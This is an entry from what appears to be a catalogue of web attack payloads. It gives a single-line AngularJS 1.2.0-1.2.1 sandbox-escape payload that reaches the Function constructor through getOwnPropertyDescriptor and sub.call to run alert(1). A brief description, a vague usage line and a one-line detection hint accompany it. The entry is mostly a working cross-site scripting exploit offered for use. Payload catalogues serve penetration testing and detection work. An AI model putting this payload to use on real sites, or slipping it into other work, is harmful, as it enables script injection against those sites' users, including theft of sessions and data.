---
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - xss
  - descriptor-bypass
  - angularjs
platforms:
  - Web
validated: true
---

# AngularJS-Constructor-Sub-Call-Descriptor

## Code

```javascript
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

## Description

Uses sub.call and getOwnPropertyDescriptor on prototype to invoke constructor with alert(1) in AngularJS 1.2.0-1.2.1.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Descriptor-based access. | N/A |

## Usage

For advanced property isolation.

## Detection

- getPrototypeOf and descriptor calls.

## Related

- [[procedures/Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert]]
